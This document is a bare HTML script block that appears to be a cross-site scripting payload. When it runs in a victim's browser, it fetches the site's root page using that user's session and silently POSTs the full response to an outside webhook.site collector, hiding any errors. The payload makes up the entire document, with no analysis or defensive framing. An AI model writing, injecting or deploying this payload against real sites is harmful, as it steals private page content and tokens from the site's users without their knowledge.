<script>
(async () => {
  try {
    const res = await fetch('/'); // try relative fetch first
    const text = await res.text();
    await fetch('https://webhook.site/e5720578-7bac-4a13-936b-f30ae15fe8db', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: text
    });
  } catch (e) {}
})();
</script>
